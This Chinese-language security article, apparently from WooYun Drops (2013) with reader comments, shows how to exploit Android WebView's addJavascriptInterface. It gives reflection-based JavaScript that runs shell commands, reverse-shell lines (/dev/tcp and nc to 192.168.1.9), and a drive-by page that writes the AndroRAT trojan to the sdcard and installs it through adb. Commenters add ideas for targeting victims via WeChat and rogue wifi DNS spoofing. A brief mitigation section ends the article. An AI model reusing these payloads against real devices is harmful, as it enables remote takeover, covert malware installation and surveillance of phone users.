<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">WebView中接口隐患与手机挂马利用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">livers</a> <span class="bull">·</span> <time title="2013/09/04 15:21" ui-time="" datetime="2013/09/04 15:21" class="published ng-binding ng-isolate-scope">2013/09/04 15:21</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>在android的sdk中封装了webView控件。这个控件主要用开控制的网页浏览。在程序中装载webView控件，可以设置属性（颜色，字体等）。类似PC下directUI的功能。在webView 下有一个非常特殊的接口函数addJavascriptInterface。能实现本地java和js的交互。利用addJavascriptInterface这个接口函数可实现穿透webkit控制android 本机。</p><h2>0x01 检测利用</h2><hr><p>一般使用html 来设计应用页面的几乎不可避免的使用到addJavascriptInterface，包含不限于android浏览器。</p><p>在android 代码程序一般是这样使用：</p><pre><code>#!java
settings.setJavaScriptEnabled(true);
settings.setJavaScriptCanOpenWindowsAutomatically(true);
mWebView.addJavascriptInterface(new JSInvokeClass(), "js2java");
</code></pre><p>这里可以用</p><pre><code>apk-&gt;zip-&gt;dex-&gt;dex2jar-&gt;jdgui-&gt;java
</code></pre><p>代码来查找。</p><p>但建议用apktool 反编译smali（毕竟不是所有apk都能反编译成java代码）</p><p>在smali代码中 则是类似下列的代码：</p><pre><code>const-string v0, " js2java "
invoke-virtual {p1, v1, v0},Lcom/tiantianmini/android/browser/module/ac;-&gt;addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V
</code></pre><p>当检测到存在上述代码时，可以进行进一步验证利用：</p><p>在11年，已经有人利用addJavascriptInterface进行文件读写，并放出简单的poc,到12年出现了简单的执行代码的exp。利用的是反射回调java类的内置静态变量。如下列的利用代码；</p><pre><code>&lt;script&gt;
function execute(cmdArgs)
{
    return js2java.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}
…
&lt;/script&gt;   
</code></pre><p>利用java的exec执行linux的shell命令。</p><h2>0x02 远程获取shell</h2><hr><p>套用yuange的一句话：Poc远远小于exp的价值。</p><p>利用addJavascriptInterface实现shell.</p><p>Android内部的armlinux 是没有busybox 的，一些常规弹shell的方法被限制。</p><p>使用了java的反弹shell方法</p><pre><code>//execute(["/system/bin/sh","-c","exec 5&lt;&gt;/dev/tcp/192.168.1.9/8088;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"]);
</code></pre><p>在Nexus One 4.3的android虚拟机 并未成功弹出shell.</p><p>后发现android中可执行 nc命令 （阉割版的不带-e的nc）</p><p>这里用了nc的另外一种弹shell的方法完成</p><p>Exp 内容：</p><pre><code>#!javascript
&lt;script&gt;
function execute(cmdArgs)
{
return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}
execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]);
alert("ok3");
&lt;/script&gt;
</code></pre><p>// 注 xxx 保护隐私用xx代指。</p><p>效果如下 ￼ <img alt="enter image description here" img-src="43421823c10981f61790800e6b2439aff621c4f1.jpg"></p><p>当然可以用远程IP地址。</p><h2>0x03 远程挂马</h2><hr><p>毕竟是android环境，shell使用不是很方便。类似xsser肯定不满足于此。</p><p>再升华下，实现网页挂马。</p><p>Android 4.1已经加入ASLR技术,堆喷射之类不再有效。UAF要针对android的内核版本。利用自身特性的漏洞是目前比较靠谱的方法。</p><p>这里以androrat远控木马为例。</p><p>实现网页挂马</p><p>大部分浏览器已经对下载文件进行保存提示。这里需要把andrat.apk写到挂马网页之中。</p><pre><code>#!javascript
&lt;script&gt;
function execute(cmdArgs)
{
return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
} 

var armBinary = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4x80x22x61xE3xAAx42x4DxC7x22x86x4Ax91xA8x14xC4x0Ax56x7CxC2x27x68x1Cx39x57x0Ax53x11x3Bx63x37x06xFEx01x33x1Bx43x17x36x56xFEx07xACx6Dx9FxCBx1Dx3Dx
……
var patharm = "/data/app/Androrat.apk";
var a=execute(["/system/bin/sh","-c","echo -n +armBinary+ &gt; " + patharm]);
execute(["chmod"," 755 ","/data/app/Androrat.apk"]);
</code></pre><p>这样存在几个问题：</p><p>andrat.apk的 hex value大约300k,浏览器或者java的exec可能对传入参数大小有限制，（测试的浏览器有限制无法执行）</p><p>/data/app/ 目录存在权限问题，需要root，chmod 也是同理。</p><p>Android这种静默安装要么是有root或者系统签名的install权限，要么是做成预装软件的样子并且重启。或者是2.2 版本左右可以 通过调用隐藏api安装。</p><p>经过进行fuzz实验，完成了挂马功能：</p><pre><code>#!javascript
&lt;script&gt;
function execute(cmdArgs)
{
return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
} 

var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4

var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94

var armBinary3=…
var armBinary4=…
……
var patharm = "/mnt/sdcard/Androrat.apk";
var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ &gt; " + patharm]);
//alert(a);
execute(["/system/bin/sh","-c","echo -n +armBinary2+ &gt;&gt; " + patharm]);
execute(["/system/bin/sh","-c","echo  -n +armBinary3+ &gt;&gt; " + patharm]);
execute(["/system/bin/sh","-c","echo -n +armBinary4+ &gt;&gt; " + patharm]);
execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]);
alert("over !!!");
&lt;/script&gt;
</code></pre><p>将androrat.apk拆分。</p><p>利用echo写入到sdcard中（此目录可读可写 不可执行）。</p><p>利用自身带的adb进行安装（安装各种xx手机助手的不在少数吧）。 ￼ <img alt="enter image description here" img-src="f5f8fdbe47c7140f4c379735315cfccef0dc2f71.jpg"></p><p>Androrat 成功安装，这里使用了androrat的debug=true模式。</p><p><img alt="enter image description here" img-src="f10571991f53b1609dbdfe976406534c672c6ea6.jpg"></p><p>成功连接到控制端。</p><h2>0x04 修复</h2><hr><p>1、Android 4.2 （api17）已经开始采用新的接口函数【java中应该叫方法：） 】，@JavascriptInterface 代替addjavascriptInterface, 有些android 2.3不再升级，浏览器需要兼容。</p><p>2、在使用js2java的bridge时候，需要对每个传入的参数进行验证，屏蔽攻击代码。</p><p>3、控制相关权限或者尽可能不要使用js2java的bridge。</p><p>Link: <a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a> <a href="http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29">http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)</a> <a href="http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf">http://www.cis.syr.edu/~wedu/Research/paper/webview_acsac2011.pdf</a> <a href="http://50.56.33.56/blog/?p=314">http://50.56.33.56/blog/?p=314</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/1440" rel="bookmark" id="re1">Android Adobe Reader 任意代码执行分析(附POC)</a></li><li><a href="http://drops.wooyun.org/tips/2892" rel="bookmark" id="re2">Spring框架问题分析</a></li><li><a href="http://drops.wooyun.org/tips/2494" rel="bookmark" id="re3">一种新的攻击方法——Java-Web-Expression-Language-Injection</a></li><li><a href="http://drops.wooyun.org/papers/914" rel="bookmark" id="re4">J2EE远程代码执行那些事儿(框架层面)</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">B1uH4ck</span> <span class="reply-time">2014-05-23 16:46:17</span></div><p></p><p>如果要定向打某人的话用这个加上微信朋友圈，NICE 妥妥的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lixupeng</span> <span class="reply-time">2014-03-28 22:50:10</span></div><p></p><p>学习！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-25 16:15:05</span></div><p></p><p>学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">John</span> <span class="reply-time">2014-03-19 19:28:27</span></div><p></p><p>I get the same problem. Did you solve it?</p><p>D/dalvikvm(7828): GetMethodID: not returning static method Ljava/lang/Class;.forName (Ljava/lang/String;)Ljava/lang/Class;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xiaoxin</span> <span class="reply-time">2014-01-26 10:52:33</span></div><p></p><p>只是单一调用webview的应用，能直接针对webview就好了，对内嵌webview的就是一场风暴啊。建立wifi热点，dns欺骗，能搞下一片手机啊。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小手冰凉</span> <span class="reply-time">2014-01-06 00:19:21</span></div><p></p><p>静默安装还需研究</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-08 22:16:03</span></div><p></p><p>:) ，写的不严谨。不过heap spray用ROP绕dep要利用未启用aslr模块获取gadget ,还是增加了些难度</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">A.L</span> <span class="reply-time">2013-09-08 18:43:35</span></div><p></p><p>针对文中一个细节问题<br>“Android 4.1已经加入ASLR技术,堆喷射之类不再有效。”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-09-08 18:31:05</span></div><p></p><p>这个和你说的毫无关系啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">A.L</span> <span class="reply-time">2013-09-08 18:22:04</span></div><p></p><p>heap spray基本不受aslr影响，也可以说是对抗aslr的一种有效手段。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小乐天</span> <span class="reply-time">2013-09-06 15:56:01</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ocean</span> <span class="reply-time">2013-09-06 15:51:32</span></div><p></p><p>马克</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">theduyao</span> <span class="reply-time">2013-09-06 10:28:40</span></div><p></p><p>马克</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">c2y2</span> <span class="reply-time">2013-09-06 08:55:09</span></div><p></p><p>学习了，mark.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hack雪花</span> <span class="reply-time">2013-09-05 23:47:45</span></div><p></p><p>原来如此</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Creturn</span> <span class="reply-time">2013-09-05 23:44:57</span></div><p></p><p>妹的，把小于4.2的sdk全试验了一遍每一个成功，同样的debug信息，都是提示没权限访问forName静态方法，人品问题？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-05 20:23:22</span></div><p></p><p>在类的构造方法中加入下列代码:<br>private Worker(){<br>SecurityManager manager =new SecurityManager();<br>if(manager!=null){<br>manager.checkPermission(new ReflectPermission("suppressAccessChecks"));<br>}<br>}</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">廷廷</span> <span class="reply-time">2013-09-05 20:08:57</span></div><p></p><p>学习了顶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-09-05 19:08:31</span></div><p></p><p>可以在这个类里进行判断是否有权限调用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">海盗湾V</span> <span class="reply-time">2013-09-05 18:43:53</span></div><p></p><p>顶一下！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">农夫娃哈哈</span> <span class="reply-time">2013-09-05 18:33:56</span></div><p></p><p>这个可以顶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2013-09-05 18:22:22</span></div><p></p><p>不明觉厉啊！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">╰╃清風</span> <span class="reply-time">2013-09-05 17:15:08</span></div><p></p><p>顶 好帖，支持下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">流星warden</span> <span class="reply-time">2013-09-05 16:44:33</span></div><p></p><p>啊呜。。。。乌云早就刷频了。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Creturn</span> <span class="reply-time">2013-09-05 16:41:33</span></div><p></p><p>我测试了下，但是不能根据提示，发现不能调用静态方法forName, 求解。<br>错误信息：<br>D/dalvikvm(19767): GetMethodID: not returning static method Ljava/lang/Class;.forName (Ljava/lang/String;)Ljava/lang/Class;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Windy</span> <span class="reply-time">2013-09-05 15:09:07</span></div><p></p><p>刷屏的节奏。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sky</span> <span class="reply-time">2013-09-05 14:44:13</span></div><p></p><p>乌云又要刷屏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">GaRY</span> <span class="reply-time">2013-09-05 13:41:04</span></div><p></p><p>翻译那个？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">parisy4o</span> <span class="reply-time">2013-09-05 13:15:46</span></div><p></p><p>赞，乌云又要因此刷屏了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ivan</span> <span class="reply-time">2013-09-05 12:50:21</span></div><p></p><p>碉堡了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">9k九块钱</span> <span class="reply-time">2013-09-05 12:27:56</span></div><p></p><p>顶顶，太强悍！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">孤独雪狼</span> <span class="reply-time">2013-09-05 11:44:13</span></div><p></p><p>碉堡了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-05 11:18:19</span></div><p></p><p>我在看django book里面看到你了 哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">GaRY</span> <span class="reply-time">2013-09-05 11:15:48</span></div><p></p><p>这个厉害，过来顶一下。<br>多挖挖这种基础组件里的问题，估计不止一个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">My5t3ry</span> <span class="reply-time">2013-09-05 11:08:11</span></div><p></p><p>这个必须顶</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">horseluke</span> <span class="reply-time">2013-09-05 10:45:08</span></div><p></p><p>大杀器一枚...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chu</span> <span class="reply-time">2013-09-05 09:44:43</span></div><p></p><p>帅爆！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mapconf</span> <span class="reply-time">2013-09-04 22:27:36</span></div><p></p><p>果断顶了，也稍稍了解到为什么有时候网速会飙到500k/s</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">pysolve</span> <span class="reply-time">2013-09-04 20:52:56</span></div><p></p><p>为什么要公布为什么要公布为什么要公布</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 20:34:35</span></div><p></p><p>没用过msf 的android模块 ，android下的这个java静态类的getRuntime的exec 有些限制的。试试看了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2013-09-04 19:56:36</span></div><p></p><p>挂马可以先用msf的<br>payload/android/shell/reverse_tcp</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 19:41:21</span></div><p></p><p>是啊 不少应用都做了过滤 可 腾讯这次囧大了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rayh4c</span> <span class="reply-time">2013-09-04 19:36:37</span></div><p></p><p>用webview了的都有可能吧，QQ，微信啥的 ：）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 19:23:00</span></div><p></p><p>不止包括浏览器，一些界面漂亮的app应用基本上都用了这个函数</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Bincker</span> <span class="reply-time">2013-09-04 18:32:22</span></div><p></p><p>浏览器厂商的又一次地震！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2013-09-04 17:42:32</span></div><p></p><p>牛逼、</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 17:37:48</span></div><p></p><p>闻到了新一轮的腥风血雨味道</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 17:09:15</span></div><p></p><p>博士先 girlfriend!!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 17:06:17</span></div><p></p><p>多谢rayh4c，原来你在搞android 这一块。你有我QQ 多交流呀<br>android.permission.INSTALL_PACKAGES api16以后 好像就不行了。<br>是啊，300k的马,但是某人要看挂马啊!!!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">rayh4c</span> <span class="reply-time">2013-09-04 16:56:27</span></div><p></p><p>赞下，反弹shell这个搞了好久没搞定，应该可以交叉编译搞个带e参数的nc.</p><p>应该可以直接写个小点的download&amp;exec的ARM BIN。</p><p>另外android.permission.INSTALL_PACKAGES有这个权限且有漏洞的APK应该可以静默安装。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-09-04 16:38:13</span></div><p></p><p>偶喜欢！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2013-09-04 16:36:22</span></div><p></p><p>强烈支持～ 虽然我是nokia。。等我搞个android的手机，照着你的文章玩玩。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 16:12:58</span></div><p></p><p>：) 过奖了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">心伤的胖子</span> <span class="reply-time">2013-09-04 15:48:36</span></div><p></p><p>真的需要这样的精品文章啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-09-04 15:43:37</span></div><p></p><p>多谢 心伤的胖子</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">心伤的胖子</span> <span class="reply-time">2013-09-04 15:39:43</span></div><p></p><p>我来消灭 0 留言，顶 livers</p><p></p></div></div></div></div></div></main>